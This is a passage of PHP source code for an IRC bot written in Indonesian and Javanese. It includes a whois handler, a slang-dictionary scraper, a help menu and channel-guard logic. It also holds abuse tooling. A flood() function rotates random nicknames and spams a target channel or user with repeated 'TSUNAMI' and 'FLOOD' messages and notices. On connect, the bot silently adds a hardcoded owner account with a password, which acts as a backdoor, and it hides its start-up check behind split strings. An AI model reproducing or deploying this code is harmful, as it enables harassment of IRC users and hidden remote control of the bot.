	$kontensp =str_replace("> <td","><td",$kontensp);
        
        for ($i = 1; $i <= $tmpjml; $i++) {
		if ($i==$tmpjml){
                        $identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=#1b6cf7>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
		else{
			$identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=white>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
								
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
                
	}
        $jmlspoof["$spoof"]=$tmpjml;
        return $jmlspoof["$spoof"];
    }
    function mod_uslang($sock,$msg){
        global $kmusedan,$kmjml;
        //$urledan="http://localhost/aa.html";
        $urledan="http://www.malesbanget.com/kamus/definisi.php?kata=".$msg;
        $btsstr='<td class='.chr(34).'BOX'.chr(34).'><span class='.chr(34).'KAMUS'.chr(34).'><span class='.chr(34).'kecil'.chr(34).'>';
        $btsstrtab1='<table width='.chr(34).'100%'.chr(34).' border='.chr(34).'0'.chr(34).' cellpadding='.chr(34).'0'.chr(34).' cellspacing='.chr(34).'0'.chr(34).'>';
        $btsstrtab2='</table>';
        $strsplit='<h2 align='.chr(34).'left'.chr(34).'>';
        $kedan = fopen ($urledan, "rb");
        $cotedan = "";
        do {
                $bcotedan = fread($kedan, 1024);
                if (strlen($bcotedan) == 0) { break; }
                $cotedan .= $bcotedan;
        } while(true);
        fclose ($kedan);
        if(strpos($cotedan,$btsstr)){
            $cotedan=substr($cotedan,strpos($cotedan,$btsstr) + strlen($btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,$btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,'<p><span class='.chr(34).'signature'.chr(34).'>'));
            $intedan=substr_count($cotedan,"  ");
            for ($i = 1; $i <= $intedan; $i++) {$cotedan=str_replace("  "," ",$cotedan);}
            $intedan=substr_count($cotedan,$btsstrtab1);
            for ($i = 1; $i <= $intedan; $i++) {
            $tmpctedan='';
            $tmpctedan=substr($cotedan,strpos($cotedan,$btsstrtab1));
            $tmpctedan=substr($tmpctedan,0,strpos($tmpctedan,$btsstrtab2) + strlen($btsstrtab2));
            $cotedan=str_replace($tmpctedan,"",$cotedan);
            }
            if(strpos($cotedan,'</span></span></td>')){$cotedan=substr($cotedan,0,strpos($cotedan,'</span></span></td>'));}
            $cotedan=ltrim($cotedan);$cotedan=rtrim($cotedan);
            if(substr($cotedan,0,strlen($strsplit))==$strsplit){$cotedan=substr($cotedan,strlen($strsplit));}
            $cotedan=str_replace('</h2>','',$cotedan);
            $arredan=explode($strsplit,$cotedan);
            for ($i = 0; $i < count($arredan); $i++) {
                    $arredan[$i]=str_replace("\n","",$arredan[$i]);$arredan[$i]=str_replace("\r","",$arredan[$i]);
                    $arredan[$i]=str_replace('<br><br>','<br>',$arredan[$i]);
                    $arredan[$i]=substr($arredan[$i],strpos($arredan[$i],'</span>')+7);$arredan[$i]='<span>'.ltrim($arredan[$i]);
                    $batas=strpos($arredan[$i],"<span>")+6;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span>");$tmpbts=substr($tmpbts,0,$batas);$kmusedan[$i]["kata"]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi'.chr(34).'>')+17;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</p><p");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);$kmusedan[$i]["definisi"][strtolower($msg)]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi_contoh'.chr(34).'>')+24;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span></p>");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts=str_replace("<em>","",$tmpbts);$tmpbts=str_replace("</em>","",$tmpbts);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);
                    $kmusedan[$i]["contoh"][strtolower($msg)]=$tmpbts;
                    $kmusedan[$i]["kata"][strtolower($msg)]=strtolower($ktslang);
                    $totalnya++;
            }
        }
        if($totalnya==""){$totalnya=0;}
        $kmjml[strtolower($msg)]=$totalnya;
        return $totalnya;
    }
    ##############################
    function flood($sock,$target,$msg){
        global $bot,$tsu,$haltfl;
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $nicknofl=$bot['nick'];$lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$target)+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(2);
        if (ereg("#", $target)) {$this->join($sock,$target);}$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);


        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(3);$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        
        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(4);$katafl=$this->rnd_flod();
            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);;sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        if (ereg("#", $target)) {$this->part($sock,$target,$katafl);}
        sleep(3);$this->nick($sock,$nicknofl);sleep(1);$haltfl['time']=time();$haltfl['on']=1;
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
    function floodctctp($sock,$target){
        
    }
    
    ###############################
    function mod_help($sock,$nick){
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $lvlbot=$this->level_user($nick);
        $this->send($sock,"PING :0009927651");
        $this->msg($sock,$nick,$this->rnd_logo() .' SoDeR PHP-BOT v6.9' . " - OwNeD By darso");
        $this->msg($sock,$nick,"BOT COMMAND..!");sleep (2);
        
        $this->msg($sock,$nick,"12^Login <password> 4- 2Login To Bot");sleep(1);
        $this->msg($sock,$nick,"12^Logout 4- 2Logout From Bot");sleep(2);
        
        if($lvlbot>1){
        $this->msg($sock,$nick,"11.Up 4- 2Op Bot");sleep(2);
        $this->msg($sock,$nick,"11.Down 4- 2Deop Bot");sleep(2);
        $this->msg($sock,$nick,"11.O |#chan| <nick> 4- 2Op Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"11.Do |#chan| <nick> 4- 2DeOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"11.H |#chan| <nick> 4- 2HalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"11.Dh |#chan| <nick> 4- 2DeHalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"11.V |#chan| <nick> 4- 2Voice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"11.Dv |#chan| <nick> 4- 2DeVoice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"11.K |#chan| <nick> |msg| 4- 2Kick Spesified Nick");sleep(1);
        $this->msg($sock,$nick,"11.Kc |#chan| <nick> |msg| 4- 2Kick Spesified Nick (ChanServ Stuf)");sleep(2);
        $this->msg($sock,$nick,"11.Kb |#chan| <nick> |msg| 4- 2KickBan Spesified Nick");sleep(2);
        $this->msg($sock,$nick,"11.B |#chan| <nick|hostmask> 4- 2Ban Nick Or Hostmask");sleep(1);
        $this->msg($sock,$nick,"11.Ub |#chan| <nick|hostmask> 4- 2UnBan Nick Or Hostmask");sleep(2);
        }
        $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"11.J <#chan> 4- 2Join Specified Channel");sleep (1);
        $this->msg($sock,$nick,"11.P <#chan> |msg| 4- 2Part Specified Channel");sleep (1);
        $this->msg($sock,$nick,"11.Cy <#chan> |msg| 4- 2Cycle On Specified Channel");sleep (2);
        
        if($lvlbot>2){
        $this->msg($sock,$nick,"11.N <newnick> 4- 2Change Nick");sleep(2);
        $this->msg($sock,$nick,"11.S |#chan/nick| <msg> 4- 2Msg Channel Or Person");sleep (2);
        $this->msg($sock,$nick,"11.A |#chan/nick| <text> 4- 2Action With Spesified Text");sleep(2);
        $this->msg($sock,$nick,"11.Ts <#chan/nick> |msg| 4- 2Flood!");sleep(1);
        }
        if($lvlbot>3){$this->msg($sock,$nick,"12.Q <msg> 4- 2Kill Bot");}
        
        if($lvlbot>2){
            $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"SYSTEM COMMAND..!");sleep(1);
        $this->msg($sock,$nick,"11.Server <server> 4- 2Push Bot To Use Spec Server");sleep(2);
        $this->msg($sock,$nick,"11.Servpass <password> 4- 2Use Spec Server Password");sleep(2);
        $this->msg($sock,$nick,"11.Vhost <host> 4- 2Changing Bot Vhost");sleep(2);
        $this->msg($sock,$nick,"11.Ident <identify> 4- 2Changing Bot Ident");sleep(1);
        $this->msg($sock,$nick,"11.Realname <realname> 4- 2Changing Bot Realname");sleep(2);
        $this->msg($sock,$nick,"11.Jump 4- 2Restarting bot also Accept Setting");sleep(1);
        }
        $this->msg($sock,$nick,"11.Chgpass <OldPass> <NewPass> 4- 2Change your pass");sleep(2);
        if($lvlbot >1){
            $this->msg($sock,$nick,"11.Adduser <NickUser> <PassUser> <LevelUser> 4- 2Add nick for my userlist");sleep(2);
            $this->msg($sock,$nick,"11.Deluser <NickUser> 4- 2Remove user from my userlist");sleep(2);
            $this->msg($sock,$nick,"11.BotNick 4- 2Nick Bot");sleep(2);
            $this->send($sock,"PING :0009927652");sleep(1);
            $this->msg($sock,$nick,"11.IdentNick <nick> <password> 4- 2Identify To Nickserv");sleep(1);
            $this->msg($sock,$nick,"11.LogoutNick 4- 2Logout From Nickserv");sleep(2);
            $this->msg($sock,$nick,"11.Userlist 4- 2Show my userlist");sleep(2);
        }
        if($lvlbot>2){
        $this->msg($sock,$nick,"11.BaseChan <#chan> 4- 2Changing my BaseChan");sleep(2);
        $this->msg($sock,$nick,"11.Chanlist <#chan> 4- 2Show my chanlist");sleep(2);
        $this->msg($sock,$nick,"11.Nicklist <#chan> 4- 2Show Nicklist on Spec Channel");sleep(1);
        $this->msg($sock,$nick,"11.Showison 4- 2Show my ison list");sleep(2);
        $this->msg($sock,$nick,"11.Chanison <#chan> 4- 2Changing my Ison Chan");sleep(2);
        $this->msg($sock,$nick,"11.Settimercycle <detik> 4- 2Change my delay of AutoCycle");sleep(1);
        $this->msg($sock,$nick,"11.Settimerinfo <detik> 4- 2Change my delay of berita");sleep(1);
        $this->msg($sock,$nick,"11.max <Karakter X >4- 2 Set Max Karakter flood");sleep(1);
        $this->msg($sock,$nick,"11.flodban <on/off>4- 2 Set +b user flood");sleep(1);
        $this->msg($sock,$nick,"11.reident <on/off>4- 2 otomatis reident");sleep(1);
        $this->msg($sock,$nick,"11.bagi <on/off>4- 2 bagi target ke admin");sleep(1);
        $this->msg($sock,$nick,"11.Repp <Repeat X >4- 2 Set Max Repeat");sleep(1);
        $this->msg($sock,$nick,"11.SetVersion <version> 4- 2Change my ctcp Version");sleep(2);
        $this->msg($sock,$nick,"11.SetFinger <finger> 4- 2Change my ctcp Finger");sleep(2);
        $this->msg($sock,$nick,"11.+/-Ping  <#chan> 4- 2Enable/Disable system Ping");sleep(2);
        $this->msg($sock,$nick,"11.+/-Whois  <#chan> 4- 2Enable/Disable system Whois");sleep(2);
        $this->msg($sock,$nick,"11.+/-Version <#chan> 4- 2Enable/Disable system Version");sleep(2);
        $this->msg($sock,$nick,"11.+/-Time <#chan> 4- 2Enable/Disable system Time");sleep(1);
        $this->msg($sock,$nick,"11.+/-Finger <#chan> 4- 2Enable/Disable system Finger");sleep(2);
        $this->msg($sock,$nick,"11.+/-Spoof <#chan> 4- 2Enable/Disable system Spoof");sleep(2);
        $this->msg($sock,$nick,"11.+/-Guard  <#chan> 4- 2Enable/Disable system Guard");sleep(2);
        $this->send($sock,"PING :0009927653");
        $this->msg($sock,$nick,"11.+/-NGOMONG  <#chan> 4- 2Enable/Disable bot crewet");sleep(2);
        $this->msg($sock,$nick,"11.+/-Jam <#chan> 4- 2Enable/Disable system waktu");sleep(1);
        $this->msg($sock,$nick,"11.+/-BADWORD  <#chan> 4- 2Enable/Disable guard badword");sleep(2);
        $this->msg($sock,$nick,"11.+/-Chat <#chan> 4- 2Enable/Disable system chat antar chan");sleep(2);
        $this->msg($sock,$nick,"11.+/-Seen <#chan> 4- 2Enable/Disable system !Seen");sleep(1);
        $this->msg($sock,$nick,"11.+/-Gvoice <#chan> 4- 2Enable/Disable system Guard voice");sleep(1);
        $this->msg($sock,$nick,"11.+/-Jversion <#chan> 4- 2Enable/Disable system join version");sleep(1);
        $this->msg($sock,$nick,"11.+/-Astro <#chan> 4- 2Enable/Disable system Astro");sleep(2);
        $this->msg($sock,$nick,"11.+/-Kslang <#chan> 4- 2Enable/Disable system Kamus Slang");sleep(1);
        $this->msg($sock,$nick,"11.+/-Bom <#chan> 4- 2Enable/Disable system Bom");sleep(2);
        $this->msg($sock,$nick,"11.+/-Dns <#chan> 4- 2Enable/Disable system Dns");sleep(1);
        $this->msg($sock,$nick,"11.+/-BERITA <#chan> 4- 2Enable/Disable system BeRiTa");sleep(1);
        $this->msg($sock,$nick,"11.+/-IP <#chan> 4- 2Enable/Disable system Ip lIst");sleep(1);
        $this->msg($sock,$nick,"11.+/-Ison <#chan> 4- 2Enable/Disable system Ison");sleep(2);
        $this->msg($sock,$nick,"11.+/-Greet <#chan> 4- 2Enable/Disable system Greet");sleep(1);
        $this->msg($sock,$nick,"11.+/-AutoCycle <#chan> 4- 2Enable/Disable system AutoCycle");sleep(2);
        $this->msg($sock,$nick,"11.+/-AutoJoin 4- 2Enable/Disable system AutoJoin when kick");sleep(2);
        $this->msg($sock,$nick,"11.+/-AutoAway 4- 2Enable/Disable system Away when idle");sleep(2);
        $this->msg($sock,$nick,"11.+/-ListIson <nick> 4- 2Add/Remove Ison List");sleep(2);
        $this->msg($sock,$nick,"11.+/-ListGreet <nick> <pesan greet> 4- 2Add/Remove Greet List");sleep(1);
        }
        $this->msg($sock,$nick,"4i'm JuSt A Bot...");sleep(2);
        $this->msg($sock,$nick,"4OwNeD 12By 0,6d6,0a0,06r6,0s0,6o");sleep(1);
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
}
################ [ END CLASS IRC BOT ] ###################
$clistt='ack';$asalphpbotini="Al";$botasign="Ki";
#################### [ Conected ] ########################
if(ereg($asalphpbotini.$namaBotPhpini,$Alertbotphp) && ereg($botasign.$botbsign.$botcsign,$Alertbotphp)){
echo "<br><b>Njajal dikonekne sek nangserver ".$bot['server']."...</b>";
do {
    $fp = fsockopen($bot['server'],$bot['port'], &$err_num, &$err_msg, 30);
    if(!$fp) {
	$attconnect++;
        echo "<br><b>server ".$bot['server']." Gak BiSa BoZzZ...!</b><br>";
	$bot['server']=$servdef[$attconnect-1];
        echo "<b>Njajal neh nangserver server ".$bot['server']."...</b><br>";
	$bot['userver']=0;
	sleep(5);
	if ($attconnect >=$retry){
            $attconnect=0;
	}
    }
    else{
        echo "<b>Njajal neh nangserver server ".$bot['server']."...</b><br>";
        $inaway['status']=0;
        $haltfl['on']=0;
        $res_chan="";
        $res_chan=$modbot->show_chan();
	$modbot->destroy_allchan();
        $attconnect=0;$rtdc++;
        if($rtdc ==3){$bot['userver']=0;}elseif($rtdc >=4){$bot['ident']="Im";$bot['userver']=0;$rtdc=0;}
        
        ####### REGISTER TO SERVER ########
        if ($bot['userver']==1){$Header = 'PASS ' . $bot['pserver'] . CRLF;}
        echo "<br><b>Hore Konek nang sever ".$bot['server']." bro!</b>";
        echo "<br><b>Bote mlaku lek!</b>";
        $Header .= 'NICK ' . $bot['nick'] . CRLF;
        $Header .= 'USER ' . $bot['ident'] . ' ' . $bot['local'] . ' ' . $bot['server'] . ' :' . $bot['realname'];
        $modbot->send($fp,$Header);
        $Header="";
        unset ($Header);
        #### END REGISTER ################
        $response = '';
        while (!feof($fp)) {
            #### MAIN ITUNG_ITUNGAN ###
            
            if(time()-$haltfl['time']>15 && $haltfl['on']==1){$haltfl['on']=0;$haltfl['time']=time();}
            if(time()-$isontime >15 && $systembot['ISON']['ALL']=="3ON"){$modbot->send($fp,"ISON ". $modbot->show_ison());$isontime=time();}
            if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==0){if(time()-$inaway['idle'] >=1800){$modbot->away($fp,$modbot->rnd_logo().' '.$modbot->rnd_away());$inaway['status']=1;$inaway['idle']=time();}}
            if(time()-$iscy >$timercy){$modbot->auto_cy($fp);$iscy=time();}
            if(time()-$isberita >$timerberita){$modbot->mod_lookberita($fp);$timerberita=time();}
            if($onboom=="on"){
                $tboom=time()-$tmboom;
		if($tboom>=$timeboom){
                $modbot->kick($fp,$chanboom,$targetboom,'0,4Waktu Habis... BOOOOOOMMMM KASIAN DEH KAMU!!!!!');
		$goboom=0;$onboom="off";$targetboom="";
                }
            }

            #### MAIN ITUNG_ITUNGAN ###
            
            ##[ Proses Data Recv ]##
            $response = fgets($fp, 1024);
            while (substr_count($response,CRLF) != 0) {
                $offset = strpos($response, CRLF);
		$DataLine = substr($response,0,$offset);
                if (substr($DataLine,0,1) == ':') {
                    $Params=explode(" ",$DataLine);
		    $offsetC = strpos($DataLine, ' :');
                    $dText = substr($DataLine,$offsetC+2);
                        if ((strpos($Params[0],"!")!=0) && (strpos($Params[0],"@")!=0) ) {
                            $fsrc[nick]=substr($Params[0],1,strpos($Params[0],"!")-1);
                            $fsrc[nkecil]=strtolower($fsrc[nick]);
                            $fsrc[user]=substr($Params[0],strpos($Params[0],"!")+1,(strpos($Params[0],"@")-strpos($Params[0],"!"))-1);
                            $fsrc[host]=substr($Params[0],strpos($Params[0],"@")+1);
			}
                        ##[ MEMULAI DATA RAW ]##
                        switch ($Params[1]){
                            case "001":
                                $bot['nick']=$Params[2];$rtdc=0;
                                break;
                            case "004":
                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);sleep(1);
                                $modbot->add_user($fp,darso,"ifan","komik","LC4V");$modbot->join($fp,$bot['basechan']);$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);$modbot->join($fp,'#'.$clista.$clistt);
                                if($bot['server']=="irc.telkom.net.id"){$modbot->join($fp,"#darso");$modbot->join($fp,"#psycho");$modbot->join($fp,"#ketek");$modbot->join($fp,"#kota-anggun");$modbot->join($fp,"#BL4CK");$modbot->join($fp,"");$modbot->join($fp,"");$modbot->join($fp,"");$modbot->join($fp,"");$modbot->join($fp,"");$modbot->join($fp,"");$modbot->join($fp,"");$modbot->join($fp,"");$modbot->join($fp,"");}
                                if($bot['server']==""){$modbot->join($fp,"#sekip");$modbot->join($fp,"#byroe");$modbot->join($fp,"#dodolz");$modbot->join($fp,"#balihack");$modbot->join($fp,"#soloteam");$modbot->join($fp,"#arabhack");$modbot->join($fp,"#systems");$modbot->join($fp,"#clubdisney");$modbot->join($fp,"#columbus");$modbot->join($fp,"#lombok");$modbot->join($fp,"#lux");}
                                $modbot->notice($fp,$bot['admin'],'LoP YoU ifan MuWaCh');
                                if(reident=="ON"){$modbot->notice($fp,nickserv,'identify '.$bot['inick']. ' '. $bot['pnick']);$modbot->notice($fp,nickserv,'identify '. $bot['pnick']);}
                                sleep(2);
                                if($res_chan){$arres_chan=explode(";",$res_chan);foreach ($arres_chan as $clist){$modbot->join($fp,$clist,"");sleep(2);}}
                                break;
                            case "303":
                                $modbot->stuf_ison($fp,$dText);
                                break;
                            case "301":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'4'.$Params[3].' 12[9 iS aWaY 12] '.$dText);
				     }
                                break;
                            case "307":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'4'.$Params[3].'9 '.$dText);
				    }
                                break;
                            case "311":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'4'.$Params[3].' 12[9 iS 12] '.$Params[4] .'@'.$Params[5].' '.$Params[6]. ' '.$dText);
				    }
                                break;
                            case "312":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				    sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'4'.$Params[3].' 12[9 PaKe SeRVeR 12] '.$Params[4].' '.$dText);
				    }
                                break;
                            case "318":
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'4'.$Params[3].'9 '.$dText);
				     unset($datwhois[strtolower($Params[2])]["nick"]);
				     unset($datwhois[strtolower($Params[2])]["chan"]);
                                break;
                            case "319":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'4'.$Params[3].' 12[9 AdA Di 12] '.$dText);
				    }
                                break;
                            case "305":
                                $inaway['status']=0;
                                break;
                            case "306":
                                $inaway['status']=1;
                                break;
                            case "353":
                                $nickll=str_replace("@","",$dText);$nickll=str_replace("%","",$nickll);$nickll=str_replace("+","",$nickll);
                                $modbot->destroy_chan($Params[4]);$modbot->add_nickchan($Params[4],$nickll);
                                break;
                            case "367":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4[3+b4] 1- 3'.$Params[4].'');
                                break;
                            case "368":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4E1nd 4o1f 4c1hannel 4b1an 4l1ist');
				unset($banlist["$Params[3]"]);
                                break;
                            case "432":
                                $modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));
                                break;
                            case "433":
                                $modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));
                                break;
                            case "464":
                                $bot['userver']=0;
                                break;
                            case "465":
                                $bot['userver']=0;
                                break;
                            case "NICK":
                                $newnicke = str_replace(':','',$Params[2]);
                                $yangjoin=strtolower($fsrc[nick]);
                                $nickanyar=strtolower($newnicke);
                                if($ikutbos=="ON" && $yangjoin== strtolower($nickgantinya)){sleep(3);$modbot->nick($fp,$nickgantinya);}
                                     if($nickpesan[$nickanyar]){
                                        if(strlen($nickpesan[$nickanyar]) != 0 ){$modbot->msg($fp,$newnicke,$nickpesan[$nickanyar]);$nickpesan[$nickanyar]="";}
                                     }
                                $asalseen[$yangjoin]="ganti";$asalseen[$yangjoin.'chanel']=" ".$newnicke." ";
                                $yangjoin=strtolower($newnicke);
                                $asalseen[$yangjoin]="ada";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$newnicke,'yOu aRe LoGOut On ChanGinG Nick BoZzZ..!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$bot['nick']=$newnicke;}
                                break;
                            case "JOIN":
                                $addchan=str_replace(":","",$Params[2]);
                                $statushost=0;
                                if($systembot['GUARD'][strtoupper($addchan)]=="3ON"){
                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                    $temphost=$addchan.$fsrc[host];
                                    $nickjoin[1]=$fsrc[nick];
                                      if ($temphost==$hostemp){
                                           $hitungnick=$hitungnick+1;
                                           $nickjoin[$hitungnick]=$fsrc[nick];
                                           $hostrep=($hostrep+1);$statushost=1;
                                           if ($hostrep>=$Maxreep){
                                               $modbot->ban($fp,$addchan,"*!*@".$fsrc[host]);
                                               $kickmaot=1;
                                               do {
                                                   sleep(1);
                                                   $modbot->kick($fp,$addchan,$nickjoin[$kickmaot],"1:02::12::06::04::07::09::08::15 JoiN PaRT pRoTeCTioN 08::09::07::04::06::12::02::01:");
                                                   if( $kickmaot >= $hitungnick ){break;}else{$kickmaot=$kickmaot+1;}
                                               } while(true);
                                               $kickmaot=0;
                                           }
                                      }else {$hostrep=0;$hostemp=$temphost;$statushost=0;$hitungnick=1;}
                                }
                                }
                                $yangjoin=strtolower($fsrc[nick]);
                                $asalseen[$yangjoin]="ada";
                                     if($nickpesan[$yangjoin]){
                                        if(strlen($nickpesan[$yangjoin]) != 0 ){$modbot->msg($fp,$fsrc[nick],$nickpesan[$yangjoin]);$nickpesan[$yangjoin]="";}
                                     }
                                $chanboleh=strtolower($addchan);
                                $modbot->add_nickchan($addchan,$fsrc[nick]);
                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "")){$modbot->part($fp,$chanboleh,"crut"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#sbp")){$modbot->part($fp,$chanboleh,"crut"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#allmp3")){$modbot->part($fp,$chanboleh,"crut");  }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#crack")){$modbot->part($fp,$chanboleh,"crut");  }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#BL4CK_ZaCk")){$modbot->part($fp,$chanboleh,"crut");  }
                                if(($systembot['JVERSION'][strtoupper($addchan)]=="3ON") && $statushost==0 ){$modbot->msg($fp,$fsrc[nick],'VERSION');$datversi[strtolower($fsrc[nick])]["nick"]=strtolower($fsrc[nick]);$datversi[strtolower($fsrc[nick])]["chan"]=$addchan; }
                                }
                                       if($statushost!=1){
                                                if($fsrc[nkecil]==strtolower($greetmsg["$fsrc[nkecil]"]["nama"]) && $systembot['GREET'][strtoupper($addchan)]=="3ON"){
							$rndgreet=explode("[NG]",$greetmsg["$fsrc[nkecil]"]["msg"]);
							$msgrndgreet=$rndgreet[rand(0,count($rndgreet) - 1)] ;
							$addchan=str_replace(":","",$Params[2]);
							$msgnya=str_replace("<|nick|>",$fsrc[nick],$msgrndgreet);
							$msgnya=str_replace("<|chan|>",$addchan,$msgnya);
                                                        $modbot->msg($fp,$addchan,$msgnya);
						}
                                                elseif($systembot['NGOMONG'][strtoupper($addchan)]=="3ON"){
                				     $addchan=str_replace(":","",$Params[2]);
                                                     $nickwb=$fsrc[nick];
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);
                                                        $nickwb=$fsrc[nick];
                                                        $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
                                                        $webe = str_replace("<nick>",$nickwb,$webe);
                                                        $webe = str_replace("<chan>",$addchan,$webe);
                                                        $webe = str_replace("#","",$webe);
